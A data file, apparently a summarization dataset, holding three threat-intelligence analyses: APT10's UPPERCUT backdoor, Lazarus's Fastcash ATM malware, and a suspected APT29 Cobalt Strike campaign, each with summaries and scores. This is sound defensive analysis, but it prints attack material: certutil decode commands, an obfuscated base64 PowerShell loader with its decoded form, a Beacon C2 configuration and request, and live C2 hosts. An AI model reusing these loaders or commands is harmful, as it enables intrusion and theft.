https://www.mandiant.com/resources/blog/apt10-targeting-japanese-corporations-using-updated-ttps;APT10 Targets Japanese Corporations Using Updated TTPs;"IntroductionIn July 2018, FireEye devices detected and blocked what appears to be APT10 (Menupass) activity targeting the Japanese media sector. APT10 is a Chinese cyber espionage group that FireEye has tracked since 2009, and they have a history of targeting Japanese entities.In this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor. This backdoor is well-known in the security community as ANEL, and it used to come in beta or RC (release candidate) until recently. Part of this blog post will discuss the updates and differences we have observed across multiple versions of this backdoor.Attack OverviewThe attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails. Although the contents of the malicious documents are unreadable (see Figure 3), the Japanese titles are related to maritime, diplomatic, and North Korean issues. Table 1 shows the UPPERCUT indicators of compromise (IoCs).File Name MD5 Size C2 ???????????????????????.doc Government Recommendations from the Liberal Democratic Party's Comprehensive Strategic Maritime Subcommittee 4f83c01e8f7507d23c67ab085bf79e97 843022 eservake.jetos[.]com 82.221.100.52 151.106.53.147 ????????????.doc Invitation to Lecture by Guatemalan Ambassador f188936d2c8423cf064d6b8160769f21 720384 eservake.jetos[.]com 151.106.53.147 153.92.210.208 ?????????????.doc North Korean interior swayed by the approach of the United States cca227f70a64e1e7fcf5bccdc6cc25dd 733184 eservake.jetos[.]com 153.92.210.208 167.99.121.203Table 1: UPPERCUT IoCsFor the North Korean lure, a news article with an identical title was readily available online. It's also worth noting that in the Guatemalan lure, the attacker used an unusual spelling of Guatemala in Japanese. The top result of a Google search using the same spelling led us to the event website for the lecture of the Guatemalan Ambassador, held in August 2018. Figure 1 shows the screenshot of the event page.Figure 1: Event Website for the Lecture of Guatemala AmbassadorFigure 2 shows the macro function that displays the lure document. At the bottom of this function, we can see the readable text that matches the contact information found in Figure 1. Thus, people who would have an interest in Latin American issues may have been the targets of this campaign.Figure 2: Macro to display lure documentThe initial Word documents were password protected, likely in an effort to bypass detection. Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3.Figure 3: Lure documentFigure 4 shows what happens when the malicious macro is executed.Figure 4: Macro to install UPPERCUTThe execution workflow is as follows:1. The macro drops three PEM files, padre1.txt, padre2.txt, and padre3.txt, to the victim's %TEMP% folder and then copies them from %TEMP% to the %AllUserProfile% folder.2. The macro decodes the dropped files using Windows certutil.exe with the following commands (certutil.exe is a legitimate built-in command-line program to manage certificates in Windows):C:\Windows\System32\cmd.exe"" /c certutil -decode C:\ProgramData\padre1.txt C:\ProgramData\\GUP.txt C:\Windows\System32\cmd.exe"" /c certutil -decode C:\ProgramData\padre2.txt C:\ProgramData\\libcurl.txt C:\Windows\System32\cmd.exe"" /c certutil -decode C:\ProgramData\padre3.txt C:\ProgramData\\3F2E3AB93. The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (esentutil.exe) with the following commands (esentutil.exe is also a legitimate program that is pre-installed in Windows):C:\Windows\System32\esentutl.exe"" /y C:\ProgramData\\GUP.txt /d C:\ProgramData\GUP.exe /o C:\Windows\System32\esentutl.exe"" /y C:\ProgramData\\libcurl.txt /d C:\ProgramData\libcurl.dll /oThe dropped files include the following:GUP.exe : GUP, a free (LGPL) Generic Updater. GUP is an open source binary used by Notepad++ for software updates. The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5.libcurl.dll: Malicious Loader DLL3F2E3AB9: Encrypted shellcodeFigure 5: Notepad++ signed updater4. The macro launches the legitimate executable GUP.exe.The executable sideloads the malicious DLL (libcurl.dll), which decrypts and runs shellcode (3F2E3AB9) located in the same folder.The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT. Before decoding the DLL, the shellcode uses an anti-debug technique based on ntdll_NtSetInformationThread which causes the thread to be detached from the debugger, as shown in Figure 6. The DLL is then loaded into memory and the randomly named exported function is called.Figure 6: Anti-debug technique used by shellcode5. The macro deletes the initially dropped .txt files using Windows esentutl.exe and changes the document text to an embedded message.The complete attack overview is shown in Figure 7.Figure 7: Attack overviewSeveral threat actors leverage the technique of using Windows certutil.exe for payload decoding, and APT10 continues to employ this technique.Evolution of UPPERCUTFigure 8 shows the timeline of updates for UPPERCUT. The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph. The compile time of loaders in the newer version(s) are not shown here since the timestamps are overwritten and filled with zeroes. We don't have visibility into UPPERCUT 5.2.x series, but it's possible that minor revisions were released every few months between December 2017 and May 2018.Figure 8: Timeline of UPPERCUT updatesUnlike previous versions, the exported function names are randomized in the latest version (Table 2).Encoded Payload Decoded Payload MD5 Size Import Hash Exported Function Version aa3f303c3319b14b4829fe2faa5999c1 322164 182ee99b4f0803628c30411b1faa9992 l7MF25T96n45qOGWX 5.3.2 126067d634d94c45084cbe1d9873d895 330804 5f45532f947501cf024d84c36e3a19a1 hJvTJcdAU3mNkuvGGq7L 5.4.1 fce54b4886cac5c61eda1e7605483ca3 345812 c1942a0ca397b627019dace26eca78d8 WcuH 5.4.1Table 2: Static characteristics of UPPERCUTAnother new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server. The error code is the value returned by the GetLastError function and sent in the next beacon. This was likely included to help the attackers understand the problem if the backdoor is unable to receive a response (Figure 9). This Cookie header is a unique indicator that can be used for network-based detection.Figure 9: Example of callbackEarlier versions of UPPERCUT used the hard-coded string ""this is the encrypt key"" for Blowfish encryption when communicating with a C2. However, in the latest version, the keys are hard-coded uniquely for each C2 address and use the C2's calculated MD5 hash to determine which key to use, as shown in Figure 10.Figure 10: Blowfish key generationFor instance, Table 3 lists the hard-coded C2 addresses, their MD5 hash, and the corresponding Blowfish key in the decoded payload of 126067d634d94c45084cbe1d9873d895.C2 MD5 Blowfish Key hxxp[:]//151.106.53[.]147/VxQG f613846eb5bed227ec1a5f8df7e678d0 bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489d hxxp[:]//153.92.210[.]208/wBNh1 50c60f37922ff2ff8733aaeaa9802da5 fb9f7fb3c709373523ff27824ed6a31d800e275ec5217d8a11024a3dffb577dd hxxp[:]//eservake.jetos[.]com/qIDj c500dae1ca41236830b59f1467ee96c1 d3450966ceb2eba93282aace7d7684380d87c6621bbd3c4f621caa079356004a Default Default f12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53Table 3: Example of Blowfish keysIn this example, the MD5 hash of hxxp[:]//151.106.53[.]147/VxQG will be f613846eb5bed227ec1a5f8df7e678d0. When the malware interacts with this URL, bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489d will be selected as a Blowfish key. If the MD5 hash of the URL does not match any of the listed hashes, then the default key f12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53 will be used.Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication. Table 4 shows the parameters sent to C2 server from the backdoor in the newer versions. These are sent via POST request, as shown in Figure 9.Table 4: URL parametersAdditionally, the command string is hashed using the same RGPH hashing algorithm as before. Two more commands, 0xD290626C85FB1CE3 and 0x409C7A89CFF0A727, are supported in the newer versions (Table 5).Commands Description 0x97A168D9697D40DD Download and validate file (XXHash comparison) from C2 server 0x7CF812296CCC68D5 Upload file to C2 server 0x652CB1CEFF1C0A00 Load PE file 0x27595F1F74B55278 Download, validate (XXHash comparison), execute file, and send output to C2 server 0xD290626C85FB1CE3 Format the current timestamp 0x409C7A89CFF0A727 Capture the desktop screenshot in PNG format and send it to C2 None of the above The received buffer is executed via cmd.exe and the output is then sent to the C2 serverTable 5: Supported commandsConclusionWhile APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving. In the newer versions of UPPERCUT, there is a significant change in the way backdoor initializes the Blowfish encryption key, which makes it harder for analysts to detect and decrypt the backdoor's network communications. This shows that APT10 is very capable of maintaining and updating their malware.To mitigate the threat, users are advised to disable Office macros in their settings and not to open documents from unknown sources. FireEye Multi-Vector Execution (MVX) engine is able to recognize and block this threat with the following detection names:";FireEye has detected and blocked what appears to be APT10 (Menupass) activity targeting the Japanese media sector. APT10 is a Chinese cyber espionage group that FireEye has tracked since 2009, and they have a history of targeting Japanese entities. In this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor. This backdoor is wellknown in the security community as ANEL, and it used to come in beta or RC (release candidate) until recently. Part of this blog post will discuss the updates and differences we have observed across multiple versions of this backdoor. The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails. Although the contents of the malicious documents are unreadable (see Figure 3), the Japanese titles are related to maritime, diplomatic, and North Korean issues. Table 1 shows the UPPERCUT indicators of compromise (IoCs). File Name MD5 Size C2 ?????????????????????? ?.doc Government Recommendations from the Liberal Democratic Party's Comprehensive Strategic Maritime Subcommittee 4f83c01e8f7507d23c67ab085bf79e97 843022 eservake.jetos[. ]com 82.221.100.52 151.106.53.147 ????????????? ?.doc Invitation to Lecture by Guatemalan Ambassador f188936d2c8423cf064d6b8160769f;en;{'r': 0.1991404011461318, 'p': 0.972027972027972, 'f': 0.33055885567931276};{'r': 0.14101531023368252, 'p': 0.9408602150537635, 'f': 0.24526979450937447};{'r': 0.1991404011461318, 'p': 0.972027972027972, 'f': 0.33055885567931276}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/fastcash-lazarus-atm-malware;FASTCash: How the Lazarus Group is Emptying Millions from ATMs;"How FASTCash attacks work - DetailsIn order to permit their fraudulent withdrawals from ATMs, the attackers inject a malicious Advanced Interactive eXecutive (AIX) executable into a running, legitimate process on the switch application server of a financial transaction network, in this case a network handling ATM transactions. The malicious executable contains logic to construct fraudulent ISO 8583 messages. ISO 8583 is the standard for financial transaction messaging. The purpose of this executable has not been previously documented. It was previously believed that the attackers used scripts to manipulate legitimate software on the server into enabling the fraudulent activity.However, analysis by Symantec has found that this executable is in fact malware, which we have named Trojan.Fastcash. Trojan.Fastcash has two primary functions:It monitors incoming messages and intercepts attacker-generated fraudulent transaction requests to prevent them from reaching the switch application that processes transactions. It contains logic that generates one of three fraudulent responses to fraudulent transaction requests.Once installed on the server, Trojan.Fastcash will read all incoming network traffic, scanning for incoming ISO 8583 request messages. It will read the Primary Account Number (PAN) on all messages and, if it finds any containing a PAN number used by the attackers, the malware will attempt to modify these messages. How the messages are modified depends on each victim organization. It will then transmit a fake response message approving fraudulent withdrawal requests. The result is that attempts to withdraw money via an ATM by the Lazarus attackers will be approved.Here is one example of the response logic that Trojan.Fastcash uses to generate fake responses. This particular sample has logic to construct one of three fake responses based on the incoming attacker request:For Message Type Indicator == 200 (ATM Transaction) and Point of Service Entry Mode starts with 90 (Magnetic Strip only):If Processing Code starts with 3 (Balance Inquiry):Response Code = 00 (Approved)Otherwise, if the Primary Account Number is Blacklisted by Attackers:Response Code = 55 (Invalid PIN)All other Processing Codes (with non-blacklisted PANs):Response Code = 00 (Approved)In this case, the attackers appear to have built in a capability to selectively deny transactions based on their own blacklist of account numbers. However, the capability was not implemented in this sample, and the check for blacklisting always returns ""False"".Symantec has found several different variants of Trojan.Fastcash, each of which uses different response logic. We believe that each variant is tailored for a particular transaction processing network and thus has its own tailored response logic.The PAN numbers used to carry out the FASTCash attacks relate to real accounts. According to the US-CERT report, most accounts used to initiate the transactions had minimal account activity or zero balances. How the attackers gain control of these accounts remains unclear. It is possible the attackers are opening the accounts themselves and making withdrawal requests with cards issued to those accounts. Another possibility is the attackers are using stolen cards to perform the attacks.In all reported FASTCash attacks to date, the attackers have compromised banking application servers running unsupported versions of the AIX operating system, beyond the end of their service pack support dates.Who is Lazarus?Lazarus is a very active group involved in both cyber crime and espionage. Lazarus was initially known for its involvement in espionage operations and a number of high-profile disruptive attacks, including the 2014 attack on Sony Pictures that saw large amounts of information being stolen and computers wiped by malware.In recent years, Lazarus has also become involved in financially motivated attacks. The group was linked to the $81 million theft from the Bangladesh central bank in 2016, along with a number of other bank heists.Lazarus was also linked to the WannaCry ransomware outbreak in May 2017. WannaCry incorporated the leaked ""EternalBlue"" exploit that used two known vulnerabilities in Windows (CVE-2017-0144 and CVE-2017-0145) to turn the ransomware into a worm, capable of spreading itself to any unpatched computers on the victim's network and also to other vulnerable computers connected to the internet. Within hours of its release, WannaCry had infected hundreds of thousands of computers worldwide.Ongoing threat to the financial sectorThe recent wave of FASTCash attacks demonstrates that financially motivated attacks are not simply a passing interest for the Lazarus group and can now be considered one of its core activities.As with the 2016 series of virtual bank heists, including the Bangladesh Bank heist, FASTCash illustrates that Lazarus possesses an in-depth knowledge of banking systems and transaction processing protocols and has the expertise to leverage that knowledge in order to steal large sums from vulnerable banks.In short, Lazarus continues to pose a serious threat to the financial sector and organizations should take all necessary steps to ensure that their payment systems are fully up to date and secured.ProtectionSymantec has the following detections in place to protect customers against Lazarus FASTCash attacks:MitigationOrganizations should ensure that operating systems and all other software are up to date. Software updates will frequently include patches for newly discovered security vulnerabilities that could be exploited by attackers. In all reported FASTCash attacks to date, the attackers have compromised banking application servers running unsupported versions of the AIX operating system, beyond the end of their service pack support dates.Indicators of CompromiseD465637518024262C063F4A82D799A4E40FF3381014972F24EA18BC23C3B27EE (Trojan.Fastcash Injector)CA9AB48D293CC84092E8DB8F0CA99CB155B30C61D32A1DA7CD3687DE454FE86C (Trojan.Fastcash DLL)10AC312C8DD02E417DD24D53C99525C29D74DCBC84730351AD7A4E0A4B1A0EBA (Trojan.Fastcash DLL)3A5BA44F140821849DE2D82D5A137C3BB5A736130DDDB86B296D94E6B421594C (Trojan.Fastcash DLL)";Trojan.Fastcash is a malware program designed to intercept and modify incoming ISO 8583 messages in order to approve fraudulent withdrawal requests from ATMs. The malware injects itself into a running, legitimate process on the switch application server of a financial transaction network, in this case a network handling ATM transactions. The malicious executable contains logic to construct fraudulent ISO 8583 messages. ISO 8583 is the standard for financial transaction messaging. The purpose of this executable has not been previously documented. It was previously believed that the attackers used scripts to manipulate legitimate software on the server into enabling the fraudulent activity. However, analysis by Symantec has found that this executable is in fact malware, which we have named Trojan.Fastcash. Trojan.Fastcash has two primary functions: It monitors incoming messages and intercepts attackergenerated fraudulent transaction requests to prevent them from reaching the switch application that processes transactions. It contains logic that generates one of three fraudulent responses to fraudulent transaction requests. Once installed on the server, Trojan.Fastcash will read all incoming network traffic, scanning for incoming ISO 8583 request messages. It will read the Primary Account Number (PAN) on all messages and, if it finds any containing a PAN number used by the attackers, the malware will attempt to modify these messages. How the messages are modified depends on each victim organization. It will then transmit a fake response message approving fraudulent withdrawal requests. The result is that attempts to withdraw money via an ATM by the Lazarus attackers will be approved. Here is one example of the response logic that Trojan.Fastcash uses to generate fake responses. This particular sample has logic to construct one of;en;{'r': 0.3349282296650718, 'p': 0.9459459459459459, 'f': 0.4946996427809063};{'r': 0.2948051948051948, 'p': 0.9043824701195219, 'f': 0.4446620922763015};{'r': 0.33253588516746413, 'p': 0.9391891891891891, 'f': 0.49116607387631267}
https://www.mandiant.com/resources/blog/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign;Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign;"IntroductionFireEye devices detected intrusion attempts against multiple industries, including think tank, law enforcement, media, U.S. military, imagery, transportation, pharmaceutical, national government, and defense contracting.The attempts involved a phishing email appearing to be from the U.S. Department of State with links to zip files containing malicious Windows shortcuts that delivered Cobalt Strike Beacon.Shared technical artifacts, tactics, techniques, and procedures (TTPs), and targeting connect this activity to previously observed activity suspected to be APT29.APT29 is known to transition away from phishing implants within hours of initial compromise.On November 14, 2018, FireEye detected new targeted phishing activity at more than 20 of our clients across multiple industries.(UPDATE) This campaign has targeted over 20 FireEye customers across: Defense, Imagery, Law Enforcement, Local Government, Media, Military, Pharmaceutical, Think Tank, Transportation, & US Public Sector industries in multiple geographic regions. -- FireEye (@FireEye) November 15, 2018The attacker appears to have compromised the email server of a hospital and the corporate website of a consulting company in order to use their infrastructure to send phishing emails. The phishing emails were made to look like secure communication from a Public Affairs official at the U.S. Department of State, hosted on a page made to look like another Department of State Public Affairs official's personal drive, and used a legitimate Department of State form as a decoy. This information could be obtained via publicly available data, and there is no indication that the Department of State network was involved in this campaign. The attacker used unique links in each phishing email and the links that FireEye observed were used to download a ZIP archive that contained a weaponized Windows shortcut file, launching both a benign decoy document and a Cobalt Strike Beacon backdoor, customized by the attacker to blend in with legitimate network traffic.Several elements from this campaign - including the resources invested in the phishing email and network infrastructure, the metadata from the weaponized shortcut file payload, and the specific victim individuals and organizations targeted - are directly linked to the last observed APT29 phishing campaign from November 2016. This blog post explores those technical breadcrumbs and the possible intentions of this activity.Attribution ChallengesConclusive FireEye attribution is often obtained through our Mandiant consulting team's investigation of incidents at compromised organizations, to identify details of the attack and post-compromise activity at victims. FireEye is still analyzing this activity.There are several similarities and technical overlaps between the 14 November 2018, phishing campaign and the suspected APT29 phishing campaign on 9 November 2016, both of which occurred shortly after U.S. elections. However, the new campaign included creative new elements as well as a seemingly deliberate reuse of old phishing tactics, techniques and procedures (TTPs), including using the same system to weaponize a Windows shortcut (LNK) file. APT29 is a sophisticated actor, and while sophisticated actors are not infallible, seemingly blatant mistakes are cause for pause when considering historical uses of deception by Russian intelligence services. It has also been over a year since we have conclusively identified APT29 activity, which raises questions about the timing and the similarities of the activity after such a long interlude.Notable similarities between this and the 2016 campaign include the Windows shortcut metadata, targeted organizations and specific individuals, phishing email construction, and the use of compromised infrastructure. Notable differences include the use of Cobalt Strike, rather than custom malware, however, many espionage actors do use publicly and commercially available frameworks for reasons such as plausible deniability.During the phishing campaign, there were indications that the site hosting the malware was selectively serving payloads. For example, requests using incorrect HTTP headers reportedly served ZIP archives containing only the benign publicly available Department of State form. It is possible that the threat actor served additional and different payloads depending on the link visited, however, FireEye has only observed two: the benign and Cobalt Strike variations.We provide details of this in the activity summary. Analysis of the campaign is ongoing, and we welcome any additional information from the community.Activity SummaryThe threat actor crafted the phishing emails to masquerade as a U.S. Department of State Public Affairs official sharing an official document. The links led to a ZIP archive that contained a weaponized Windows shortcut file hosted on a likely compromised legitimate domain, jmj[.].com. The shortcut file was crafted to execute a PowerShell command that read, decoded, and executed additional code from within the shortcut file.Upon execution, the shortcut file dropped a benign, publicly available, U.S. Department of State form and Cobalt Strike Beacon. Cobalt Strike is a commercially available post-exploitation framework. The BEACON payload was configured with a modified variation of the publicly available ""Pandora"" Malleable C2 Profile and used a command and control (C2) domain - pandorasong[.]com - assessed to be a masquerade of the Pandora music streaming service. The customization of the C2 profile may have been intended to defeat less resilient network detection methods dependent on the default configurations. The shortcut metadata indicates it was built on the same or very similar system as the shortcut used in the November 2016 campaign. The decoy content is shown in Figure 1.Figure 1: Decoy document contentSimilarities to Older ActivityThis activity has TTP and targeting overlap with previous activity, suspected to be APT29. The malicious LNK used in the recent spearphishing campaign, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), has technical overlaps with a suspected APT29 LNK from November 2016, 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (MD5: f713d5df826c6051e65f995e57d6817d), which was publicly reported by Volexity. The 2018 and 2016 LNK files are similar in structure and code, and contain significant metadata overlap, including the MAC address of the system on which the LNK was created.Additional overlap was observed in the targeting and tactics employed in the phishing campaigns responsible for distributing these LNK file. Previous APT29 activity targeted some of the same recipients of this email campaign, and APT29 has leveraged large waves of emails in previous campaigns.Outlook and ImplicationsAnalysis of this activity is ongoing, but if the APT29 attribution is strengthened, it would be the first activity uncovered from this sophisticated group in at least a year. Given the widespread nature of the targeting, organizations that have previously been targeted by APT29 should take note of this activity. For network defenders, whether or not this activity was conducted by APT29 should be secondary to properly investigating the full scope of the intrusion, which is of critical importance if the elusive and deceptive APT29 operators indeed had access to your environment.Technical DetailsPhishingEmails were sent from DOSOneDriveNotifications-svCT-Mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa15382822aa25821925a0245@northshorehealthgm[.]org with the subject Stevenson, Susan N shared ""TP18-DS7002 (UNCLASSIFIED)"" with you. The distribution of emails varied significantly between the affected organizations. While most targeted FireEye customers received three or fewer emails, some received significantly more, with one customer receiving 136.Each phishing email contained a unique malicious URL, likely for tracking victim clicks. The pattern of this URL is shown in Figure 2.Figure 2: Malicious URL structureOutside of the length of the sender email address, which may have been truncated on some recipient email clients, the attacker made little effort to hide the true source of the emails, including that they were not actually sent from the Department of State. Figure 3 provides a redacted snapshot of email headers from the phishing message.Figure 3: Redacted email headersThe malicious links are known to have served two variants of the file ds7002.zip. The first variant (MD5: 3fccf531ff0ae6fedd7c586774b17a2d), contained ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c). ds7002.lnk was a malicious shortcut (LNK) file that contained an embedded BEACON DLL and decoy PDF, and was crafted to launch a PowerShell command. On execution, the PowerShell command extracted and executed the Cobalt Strike BEACON backdoor and decoy PDF. The other observed variant of ds7002.zip (MD5: 658c6fe38f95995fa8dc8f6cfe41df7b) contained only the benign decoy document. The decoy document ds7002.pdf (MD5: 313f4808aa2a2073005d219bc68971cd) appears to have been downloaded from hxxps://eforms.state.gov/Forms/ds7002.PDF.The BEACON backdoor communicated with the C2 domain pandorasong[.]com (95.216.59[.]92). The domain leveraged privacy protection, but had a start of authority (SOA) record containing vleger@tutanota.com.Our analysis indicates that the attacker started configuring infrastructure approximately 30 days prior to the attack. This is a significantly longer delay than many other attackers we track. Table 1 contains a timeline of this activity.Time Event Source 2018-10-15 15:35:19Z pandorasong[.]com registered Registrant Information 2018-10-15 17:39:00Z pandorasong[.]com SSL certificate established Certificate Transparency 2018-10-15 18:52:06Z Cobalt Strike server established Scan Data 2018-11-02 10:25:58Z LNK Weaponized LNK Metadata 2018-11-13 17:58:41Z 3fccf531ff0ae6fedd7c586774b17a2d modified Archive Metadata 2018-11-14 01:48:34Z 658c6fe38f95995fa8dc8f6cfe41df7b modified Archive Metadata 2018-11-14 08:23:10Z First observed phishing e-mail sent TelemetryTable 1: Operational timelineExecutionUpon execution of the malicious LNK, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), the following PowerShell command was executed:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noni -ep bypass$zk='JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJEVudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUpO30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ1JlYWRXcml0ZSc7JG9lPU5ldy1PYmplY3QgYnl0ZVtdKCR2Y3EtJHB0Z3QpOyRyPSR2enZpLlNlZWsoJHB0Z3QsW0lPLlNlZWtPcmlnaW5dOjpCZWdpbik7JHI9JHZ6dmkuUmVhZCgkb2UsMCwkdmNxLSRwdGd0KTskb2U9W0NvbnZlcnRdOjpGcm9tQmFzZTY0Q2hhckFycmF5KCRvZSwwLCRvZS5MZW5ndGgpOyR6az1bVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkb2UpO2lleCAkems7',$fz='FromBase'+0x40+'String',$rhia=[Text.Encoding]::ASCII.GetString([Convert]::$fz.Invoke($zk)),iex $rhia,This command included some specific obfuscation, which may indicate attempts to bypass specific detection logic. For example, the use of 'FromBase'+0x40+'String', in place of FromBase64String, the PowerShell command used to decode base64.The decoded command consisted of additional PowerShell that read the content of ds7002.lnk from offset 0x5e2be to offset 0x623b6, base64 decoded the extracted content, and executed it as additional PowerShell content. The embedded PowerShell code decoded to the following:$ptgt=0x0005e2be,$vcq=0x000623b6,$tb=""ds7002.lnk"",if (-not(Test-Path $tb)){$oe=Get-ChildItem -Path $Env:temp -Filter $tb -Recurse,if (-not $oe){exit}[IO.Directory]::SetCurrentDirectory($oe.DirectoryName),}$vzvi=New-Object IO.FileStream $tb,'Open','Read','ReadWrite',$oe=New-Object byte[]($vcq-$ptgt),$r=$vzvi.Seek($ptgt,[IO.SeekOrigin]::Begin),$r=$vzvi.Read($oe,0,$vcq-$ptgt),$oe=[Convert]::FromBase64CharArray($oe,0,$oe.Length),$zk=[Text.Encoding]::ASCII.GetString($oe),iex $zk,When the decoded PowerShell is compared to the older 2016 PowerShell embedded loader (Figure 4), it's clear that similarities still exist. However, the new activity leverages randomized variable and function names, as well as obfuscating strings contained in the script.Figure 4: Shared functions to loader in older activity (XOR decode function and CopyFilePart)The PowerShell loader code is obfuscated, but a short de-obfuscated snippet is shown as follows. The decoy PDF and BEACON loader DLL are read from specific offsets within the LNK, decoded, and their contents executed. The BEACON loader DLL is executed with the export function ""PointFunctionCall"":[TRUNCATED]$jzffhy = [IO.FileAccess]::READ$gibisec = myayxvj $(""ds7002.lnk"")$oufgke = 0x48bd8$wabxu = 0x5e2be - $oufgke$lblij = bygtqi $gibisec $oufgke $wabxu $(""%TEMP%\ds7002.PDF"") Invoke-Item$((lylyvve @((7,(30 + 0x34 - 3),65,(84 - 5),(-38 + 112),(-16 + 0x25 + 52))) 35))$oufgke = 0x0dd8$wabxu = 0x48bd8 - $oufgke$yhcgpw = bygtqi $gibisec $oufgke $wabxu $(""%LOCALAPPDATA%\cyzfc.dat"") if($ENV:PROCESSOR_ARCHITECTURE -eq $(""AMD64"")) { & ($(""rundll32.exe"")) $("","")$(""PointFunctionCall"") }Files DroppedUpon successful execution of the LNK file, it dropped the following files to the victim's system:%APPDATA%\Local\cyzfc.dat (MD5: 16bbc967a8b6a365871a05c74a4f345b) BEACON loader DLL(MD5: 16bbc967a8b6a365871a05c74a4f345b) %TEMP%\ds7002.PDF (MD5: 313f4808aa2a2073005d219bc68971cd) Decoy document(MD5: 313f4808aa2a2073005d219bc68971cd)The dropped BEACON loader DLL was executed by RunDll32.exe using the export function ""PointFunctionCall"":""C:\Windows\system32\rundll32.exe""C:\Users\Administrator\AppData\Local\cyzfc.dat, PointFunctionCallThe BEACON payload included the following configuration:authorization_id: 0x311168cdns_sleep: 0http_headers_c2_post_req:Accept: */*Content-Type: text/xmlX-Requested-With: XMLHttpRequestHost: pandorasong.comhttp_headers_c2_request:Accept: */*GetContentFeatures.DLNA.ORG: 1Host: pandorasong[.]comCookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7,jitter: 17named_pipes: \\\\%s\\pipe\\msagent_%xprocess_inject_targets:%windir%\\syswow64\\rundll32.exe%windir%\\sysnative\\rundll32.exebeacon_interval: 300c2:conntype: SSLhost: pandorasong[.]comport: 443c2_urls:pandorasong[.]com/radio/xmlrpc/v45pandorasong[.]com/access/c2_user_agents: Mozilla/5.0 (Windows NT 10.0, WOW64, Trident/7.0, rv:11.0) like GeckoNetwork CommunicationsAfter successful installation/initialization of the malware, it made the following callback to the C2 server pandorasong[.]com via TCP/443 SSL. The sample was configured to use a malleable C2 profile for its network communications. The specific profile used appears to be a modified version of the publicly available Pandora C2 profile. The profile may have been changed to bypass common detections for the publicly available malleable profiles. The following is a sample GET request:GET /access/?version=4&lid=1582502724&token=ajlomeomnmeapoagcknffjaehikhmpepBdhmoefmcnoiohgkkaabfoncfninglnlbmnaahmhjjfnopdapdaholmanofaoodkiokobenhjdMjcmoagoimbahnlbdelchkffojeobfmnemdcoibocjgnjdkkbfeinlbnflaeiplendldlbhnhjmbgagigjniphmemcbhmaibmfibjekfcimjlhnlamhicakfmcpljaeljhcpbmgblgnappmkpbckoHTTP/1.1Accept: */*GetContentFeatures.DLNA.ORG: 1Host: pandorasong.comCookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7,User-Agent: Mozilla/5.0 (Windows NT 10.0, WOW64, Trident/7.0, rv:11.0) likeGeckoConnection: Keep-AliveCache-Control: no-cacheSimilarities to Older ActivityFigure 5 and Figure 6 show the overlapping characteristics between the LNK used in the recent spear phish emails, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), compared to a suspected APT29 LNK from the November 2016 attack that led to the SPIKERUSH backdoor, 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (MD5: f713d5df826c6051e65f995e57d6817d).Figure 5: LNK characteristics: new activity (left) and old activity (right)Figure 6: LNK characteristics: new activity (left) and old activity (right)In addition to similar LNK characteristics, the PowerShell command is very similar to the code from the older sample that executed the SPIKERUSH backdoor. Some of the same variable names are retained in this new version, as seen in Figure 7 and Figure 8.Figure 7: Embedded PowerShell: new activity (left) and old activity (right)Figure 8: Shared string obfuscation logic: new LNK activity (left) and old VERNALDROP activity (right)IndicatorsIndicator Description dosonedrivenotifications-svct-mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa15382822aa25821925a0245@northshorehealthgm[.]org Phishing email address from likely compromised legitimate server Stevenson, Susan N shared ""TP18-DS7002 (UNCLASSIFIED)"" with you Phishing email subject https://www.jmj[.]com/personal/nauerthn_state_gov/* Malware hosting location on likely compromised legitimate domain pandorasong[.]com BEACON C2 95.216.59[.]92 Resolution of pandorasong[.]com 2b13b244aafe1ecace61ea1119a1b2ee SSL certificate for pandorasong[.]com 3fccf531ff0ae6fedd7c586774b17a2d Malicious ZIP archive MD5 658c6fe38f95995fa8dc8f6cfe41df7b Benign ZIP archive MD5 6ed0020b0851fb71d5b0076f4ee95f3c Malicious LNK file MD5 313f4808aa2a2073005d219bc68971cd Benign decoy PDF MD5 16bbc967a8b6a365871a05c74a4f345b BEACON DLL MD5 %APPDATA%\Local\cyzfc.dat BEACON DLL file path 